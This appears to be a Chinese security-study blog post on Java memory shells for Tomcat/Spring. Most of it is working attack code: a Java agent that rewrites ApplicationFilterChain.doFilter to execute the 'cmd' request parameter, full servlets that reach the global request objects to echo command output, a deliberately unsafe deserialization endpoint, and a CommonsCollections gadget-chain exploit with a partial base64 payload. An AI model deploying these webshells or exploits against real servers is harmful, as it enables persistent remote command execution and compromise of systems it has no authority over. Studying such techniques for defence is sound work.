process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```
根据责任链机制，存在一个反复调用的链internalDoFilter->doFilter->service，springboot会反复调用internalDofilter方法，那么动态修改internalDoFilter或者是DoFilter，就存在一个内存马注入。

```java
public void doFilter(ServletRequest request, ServletResponse response)
        throws IOException, ServletException {
 
        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                        (java.security.PrivilegedExceptionAction<Void>) () -> {
                            internalDoFilter(req,res);
                            return null;
                        }
                );
            } ...
            }
        } else {
            internalDoFilter(request,response);
        }
    }
```
```java
private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
```
两个方法均有ServletRequest和SerletResponse。
构造马：
agentmain
```java
package com.enterpr1se.agentmain;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class agentmain_transform {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class [] classes = inst.getAllLoadedClasses();

        //获取目标JVM加载的全部类
        for(Class cls : classes){
            if (cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){

                //添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new FIlter_Transform(),true);
                inst.retransformClasses(cls);
            }
        }
    }
}


```
transform类
```java
package com.enterpr1se.agentmain;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class FIlter_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        //获取类池

        try {
            ClassPool classPool = ClassPool.getDefault();

            if(classBeingRedefined!=null){
                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            CtClass ctclass  = classPool.get("org.apache.catalina.core.ApplicationFilterChain");
            CtMethod ctMethod = ctclass.getDeclaredMethod("doFilter");

            String body = "{" +
                    "javax.servlet.http.HttpServletRequest request = $1;\n" +
                    "String cmd=request.getParameter(\"cmd\");\n" +
                    "if (cmd !=null){\n" +
                    "  Runtime.getRuntime().exec(cmd);\n" +
                    "  }"+
                    "}";
            ctMethod.setBody(body);

            byte[] bytes = ctclass.toBytecode();
            return bytes;
        } catch (NotFoundException | CannotCompileException | IOException e) {
            e.printStackTrace();
        }

        return null;

    }

}

```

```java
Manifest-Version: 1.0
Agent-Class: com.enterpr1se.agentmain.agentmain_transform
Can-Redefine-Classes: true
Can-Retransform-Classes: true

```
启动spring，然后根据类，进行注入。
```java
package com.enterpr1se.inject;


import com.sun.tools.attach.*;


import java.io.IOException;
import java.util.List;

public class Inject_Agent {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {


        List<VirtualMachineDescriptor> list  = VirtualMachine.list();
        for(VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            if(vmd.displayName().equals("com.example.spring.SpringtestApplication")){
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());
                virtualMachine.loadAgent("D:\\java\\JavaAgent\\target\\JavaAgent-1.0-SNAPSHOT-jar-with-dependencies.jar");
                virtualMachine.detach();
            }
        }


    }
}

```
访问两次，第一次调用dofilter，注册恶意方法，第二次直接调用。

# 回显方法
当目标及其不出网的时候，就要用到回显技术输出结果。关键就是获取request和response对象。

## ThreadLocal Response~
这玩意儿简单来说就是线程安全，本质是个静态map，key为handle，不提供接口和遍历，每个线程都只能获取自己的value，从而保证了线程的安全。




寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息.
在ApplicationFilterChain里面
```java
public final class ApplicationFilterChain implements FilterChain {
    private static final ThreadLocal<ServletRequest> lastServicedRequest;
    private static final ThreadLocal<ServletResponse> lastServicedResponse;
```
能得到lastServicedRequest和lastServicedResponse，都是静态的，获取时无需实例化对象。


且在internalDoFilter方法中，
```java
try {
                if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                    lastServicedRequest.set(request);
                    lastServicedResponse.set(response);
                }

```
ApplicationDispatcher.WRAP_SAME_OBJECT可以通过反射修改。


思路如下：

1. 反射修改ApplicationDispatcher.WRAP_SAME_OBJECT的值，通过ThreadLocal#set方法将request和response对象存储到变量中
2. 初始化lastServicedRequest和lastServicedResponse两个变量，默认为null
3. 通过ThreadLocal#get方法将request和response对象从_lastServicedRequest_和_lastServicedResponse_中取出

反射获得属性
```java
Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
```
修改final修饰符，变成可访问。
modifiers实际就是一个int类型的26，并且每个修饰符都有一个int的值，比如private是2，static是8，final是16那么我们只需要把目标属性的modifiers属性减去16，就相当于去除了final属性，而图中取反然后按位与操作就是这一步骤
```java
java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
        WRAP_SAME_OBJECT_FIELD.setAccessible(true);
        lastServicedRequestField.setAccessible(true);
        lastServicedResponseField.setAccessible(true);
```
修改一下字段，为true，过if
```java
if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){
            WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
        }
```
创建对象之类的。
```java
if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }
            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }

            if (lastServicedRequestField.get(null) != null) {
                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
                System.out.println(servletRequest);
                System.out.println((HttpServletRequest) servletRequest == req);
```
完整版
```java
package com.shell.servlet;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

import org.apache.catalina.core.ApplicationFilterChain;


@WebServlet("/echo")
public class Tomcat_Echo extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) {
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }

            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }
            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }

            if (lastServicedRequestField.get(null) != null) {
                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
                ServletRequest servletRequest = (ServletRequest) threadLocal.get();
                System.out.println(servletRequest);
                System.out.println((HttpServletRequest) servletRequest == req);
            } }catch (NoSuchFieldException e) {
                e.printStackTrace();
            }catch (ClassNotFoundException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            }

    }
```
下个断点看一下。
第一次访问的时候，将request和response对象存入了变量。
第二次访问的时候，直接就拿到了线程的request和response![微信截图_20230621154013.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1687333240129-8e102680-b1c7-41fa-ae71-89c394d8ec86.png#averageHue=%233d4042&clientId=ue9719262-347f-4&from=paste&height=191&id=uc78f4c8b&originHeight=239&originWidth=781&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11210&status=done&style=none&taskId=u9b27e698-53dc-4c4c-b8a3-999137c4416&title=&width=624.8)
由于shiro框架中重写了dofilter，没办法通过这种方法回显，
那么便有了另一种想法：寻找tomcat的全局request和response。

在AbstractProcessor中
```java
protected final Request request;
    protected final Response response;
```
调用栈
```java
doGet:22, Tomcat_Echo (com.shell.servlet)
service:489, HttpServlet (javax.servlet.http)
service:583, HttpServlet (javax.servlet.http)
internalDoFilter:212, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
doFilter:51, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:181, ApplicationFilterChain (org.apache.catalina.core)
doFilter:156, ApplicationFilterChain (org.apache.catalina.core)
invoke:167, StandardWrapperValve (org.apache.catalina.core)
invoke:90, StandardContextValve (org.apache.catalina.core)
invoke:483, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:130, StandardHostValve (org.apache.catalina.core)
invoke:93, ErrorReportValve (org.apache.catalina.valves)
invoke:682, AbstractAccessLogValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:617, Http11Processor (org.apache.coyote.http11)
process:63, AbstractProcessorLight (org.apache.coyote)
process:932, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1695, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:52, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:722, Thread (java.lang)
```
其中就有Http11Processor的service方法。
该类继承自AbstractProcessor
```java
Http11Processor extends AbstractProcessor
```
当前response对象就是abstractProcessor的。
找到AbstractProtocol里面register方法，存储了response对象。
```java
protected void register(Processor processor) {
            if (this.getProtocol().getDomain() != null) {
                synchronized(this) {
                    try {
                        long count = this.registerCount.incrementAndGet();
                        RequestInfo rp = processor.getRequest().getRequestProcessor();
                        rp.setGlobalProcessor(this.global);
```
该属性中存储了一个RequestInfo的List，其中在RequestInfo中我们也能获取Request
```java
private final RequestGroupInfo global = new RequestGroupInfo();
```
```java
public class RequestGroupInfo {
    private final ArrayList<RequestInfo> processors = new ArrayList();
```
在前面process方法中调用register
```java
if (processor == null) {
                            processor = this.getProtocol().createProcessor();
                            this.register(processor);
                        }
```
一个调用栈就出来了：
```java
AbstractProtocol$ConnectoinHandler#process()------->this.global-------->RequestInfo------->Request-------->Response
```
获取AbstractProtocol类。


CoyoteAdapter类里面存在一个connector属性。
```java
private final Connector connector;
```
connector的定义存在和AbstractProtocol相关的protocolHandler属性。
![](https://cdn.nlark.com/yuque/0/2023/png/34502958/1687342809075-7c35015c-a23a-40ae-a58f-34c3333d7a36.png#averageHue=%232d3742&clientId=ue9719262-347f-4&from=paste&id=u6805032d&originHeight=56&originWidth=321&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u27fc510a-df89-4336-906b-0a7eb1bccd9&title=)
查看该属性的值![](https://cdn.nlark.com/yuque/0/2023/png/34502958/1687343038888-51f27bd1-ad61-4d33-aeb0-d433bbf75a13.png#averageHue=%235f7b54&clientId=ue9719262-347f-4&from=paste&id=uaac97e11&originHeight=56&originWidth=660&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=u4f6a2ca4-ec06-49b9-a2c9-96cf83ec3f4&title=)
可以发现，是一个Http11NioProtocol对象。
并继承了AbstractProtocol类。
![](https://cdn.nlark.com/yuque/0/2023/png/34502958/1687343158353-8acef6f9-66bf-44f4-8f33-6043f62f0e59.png#averageHue=%23394451&clientId=ue9719262-347f-4&from=paste&id=u245a0632&originHeight=135&originWidth=573&originalType=url&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&taskId=ud13c259a-884b-4d0f-b19a-a6f3a60e5bc&title=)
此时调用链成了：
```java
Connector----->Http11NioProtocol----->AbstractProtocol$ConnectoinHandler#process()------->this.global-------->RequestInfo------->Request-------->Response
```
然后是获取connector的过程。
在addconnector里面
```java
public void addConnector(Connector connector) {
        synchronized(this.connectorsLock) {
            connector.setService(this);
            Connector[] results = new Connector[this.connectors.length + 1];
            System.arraycopy(this.connectors, 0, results, 0, this.connectors.length);
            results[this.connectors.length] = connector;
            this.connectors = results;
            if (this.getState().isAvailable()) {
                try {
                    connector.start();
                } catch (LifecycleException var6) {
                    log.error(sm.getString("standardService.connector.startFailed", new Object[]{connector}), var6);
                }
            }

            this.support.firePropertyChange("connector", (Object)null, connector);
        }
    }
```
创建了connetor数组，并创造了connector
调用链
```java
StandardService----->Connector----->Http11NioProtocol----->AbstractProtocol$ConnectoinHandler#process()------->this.global-------->RequestInfo------->Request-------->Response
```
tomcat的类加载
不同于传统类加载，为了隔离不同webapp的依赖，避免冲突，每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。
Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。
Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器。如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。
WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。

## 构造payload
##### 获取StandardContext
```java
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
```
##### 获取ApplicationContext
```java
 Field  context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
        context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
```
采用反射获取
获取standardservice。
```java
Field standardServiceField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("service");
        standardServiceField.setAccessible(true);
            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);
```
反射获取connector
```java
Field connectorField = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("connectors");
            connectorField.setAccessible(true);
            Connector[] connectors = (Connector[]) connectorField.get(standardService);
            Connector connector = connectors[0];
```
获取handler
```java
ProtocolHandler protocolHandler = connector.getProtocolHandler();
            Field handlerField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
            handlerField.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
```
通过Connector#getProtocolHandler方法来获取对应的protocolHandler。
这个是Http11NioProtocol对象，
继承了AbstractProtocol对象。
这里获取内部类connectionhandler。

获取global属性。
```java
Field globalhandler = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
            globalhandler.setAccessible(true);
            RequestGroupInfo global = (RequestGroupInfo) globalhandler.get(handler);
```
比较常规
获取processor
global属性的RequestGroupInfo类中的processors数组用来存储RequestInfo对象

```java
Field processField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
            processField.setAccessible(true);
            List<RequestInfo> requestInfoList = (List<RequestInfo>) processField.get(global);
```
获取request和response并写入回显内容
```java
Field requestFeild = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("req");
            requestFeild.setAccessible(true);

            for(RequestInfo requestInfo: requestInfoList){
                //获取org.apache.coyote.Request
                org.apache.coyote.Request request = (org.apache.coyote.Request)requestFeild.get(requestInfo);

//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
                org.apache.catalina.connector.Request http_request =(org.apache.catalina.connector.Request) request.getNote(1);
                org.apache.catalina.connector.Response http_response = http_request.getResponse();

                PrintWriter writer =http_response.getWriter();
                String cmd = http_request.getParameter("cmd123");

                InputStream inputStream = Runtime.getRuntime().exec("exec").getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");//\\a用于整个命令的读取
                String result = scanner.hasNext()? scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
```
完整版
```java
package com.example.spring.Servlet;

import org.apache.catalina.Context;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.*;
import org.apache.tomcat.util.net.AbstractEndpoint;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

@WebServlet("/response")
public class Tomcat_Echo_Response extends HttpServlet {
    @Override
    protected  void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{

        try{
            //获取standardcontext
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
        Context standardContext =  webappClassLoaderBase.getResources().getContext();
//获取applicationcontext
        Field  context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
        context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);

//获取standaedservice
        Field standardServiceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
        standardServiceField.setAccessible(true);
            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);
//获取connector
            //Field connectorField = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("connectors");
            //connectorField.setAccessible(true);
            //Connector[] connectors = (Connector[]) connectorField.get(standardService);
            Connector[] connectors = standardService.findConnectors();
            //Connector connector = connectors[0];


            for(Connector connector:connectors) {
                if(connector.getScheme().contains("http")){
                    //拿个AbstractProtocol
                    AbstractProtocol abstractProtocol = (AbstractProtocol) connector.getProtocolHandler();

                    //获取abstractprotocol内部的connectionhandler
                    Method gethandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                    gethandler.setAccessible(true);
                    AbstractEndpoint.Handler ConnectionHandler = (AbstractEndpoint.Handler)gethandler.invoke(abstractProtocol);


                    //global
                    Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    RequestGroupInfo global = (RequestGroupInfo) globalField.get(ConnectionHandler);

                    //获取processors
                    Field processorsField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    ArrayList processors = (ArrayList) processorsField.get(global);


                    for(Object processor:processors){
                        RequestInfo requestInfo = (RequestInfo) processor;
                        if(requestInfo.getCurrentQueryString().contains("cmd")){
                            Field requestField = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                            requestField.setAccessible(true);
                            Request requesttemp = (Request) requestField.get(requestInfo);

                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requesttemp.getNote(1);

                            String cmd = request.getParameter("cmd");
                            String[] cmds = null;
                            if(cmd!=null){
                                if(System.getProperty("os.name").toLowerCase().contains("win")){
                                    cmds = new String[]{"cmd","/c",cmd};

                                }else{
                                    cmds = new String[]{"/bin/sh","-c",cmd};
                                }
                                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                                Scanner s = new Scanner(inputStream).useDelimiter("//A");
                                String output = s.hasNext() ? s.next() : "";
                                PrintWriter writer = request.getResponse().getWriter();
                                writer.write(output);
                                writer.flush();
                                writer.close();

                                break;
                            }


                        }

                    }

                }
//获取handler
               /* ProtocolHandler protocolHandler = connector.getProtocolHandler();
                Field handlerField = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
                handlerField.setAccessible(true);
                AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);


//获取global
                Field globalhandler = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                globalhandler.setAccessible(true);
                RequestGroupInfo global = (RequestGroupInfo) globalhandler.get(handler);
//获取processor
                Field processField = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                processField.setAccessible(true);
                List<RequestInfo> requestInfoList = (List<RequestInfo>) processField.get(global);

//获取request和response
                Field requestFeild = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("req");
                requestFeild.setAccessible(true);

                for (RequestInfo requestInfo : requestInfoList) {


                    //获取org.apache.coyote.Request
                    Request request = (Request) requestFeild.get(requestInfo);

//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
                    org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
                    org.apache.catalina.connector.Response http_response = http_request.getResponse();

                    PrintWriter writer = http_response.getWriter();
                    String cmd = http_request.getParameter("cmd123");

                    InputStream inputStream = Runtime.getRuntime().exec("exec").getInputStream();
                    Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");//\\a用于整个命令的读取
                    String result = scanner.hasNext() ? scanner.next() : "";
                    scanner.close();
                    writer.write(result);
                    writer.flush();
                    writer.close();
                }*/

                }

            }

        catch(ClassNotFoundException e){
            e.printStackTrace();}
        catch (NoSuchFieldException e){
            e.printStackTrace();
        }catch (IllegalAccessException e){
            e.printStackTrace();
        }
        catch (NoSuchMethodException e){
            e.printStackTrace();
        }
        catch (InvocationTargetException e){
            e.printStackTrace();
        }
        }
    }



```
feng佬的版本有点问题，我这里选择了boogipop师傅的payload。被注释掉的就是废案。

# 打tmd反序列化
内存马的注入，往往可以配合反序列化打进去。
编写个反序列化入口
```java
package com.example.spring.Servlet;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;


@WebServlet("/unserial")
public class Unserial_Servlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        byte[] data = Base64.getDecoder().decode(req.getParameter("data"));
        ByteArrayInputStream inputStream = new ByteArrayInputStream(data);
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        try {
            System.out.println(objectInputStream.readObject());
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req,resp);
    }
}

```

打个cc链
```java
package CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3_2 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {

        TemplatesImpl templatesimpl=new TemplatesImpl();

        //getTransletInstance()第一个判断
        Class c=templatesimpl.getClass();
        Field _nameField=c.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesimpl,"aaa");

        //要加载类的字节码
        Field _byteCodesField=c.getDeclaredField("_bytecodes");
        _byteCodesField.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("D:\\tmp\\classes\\evilclass.class"));
        byte[][] codes= {code};
        _byteCodesField.set(templatesimpl,codes);

//防止报错
        Field tfactory = c.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templatesimpl,new TransformerFactoryImpl());

        //用来初始化TemplatesImpl类
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesimpl});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };

        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);


        HashMap<Object,Object> map=new HashMap<>();
        map.put("value","value");
        Map<Object,Object> transformedMap= TransformedMap.decorate(map,null,chainedTransformer);


        Class c2=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor AnnotationInvocationHandlerConstructor=c2.getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object o=AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
        serialize(o);
        unserialize("ser.bin");
    }
    //序列化
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    //反序列化
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object object=ois.readObject();
        return object;
    }
}
```
转b64
```java
rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWw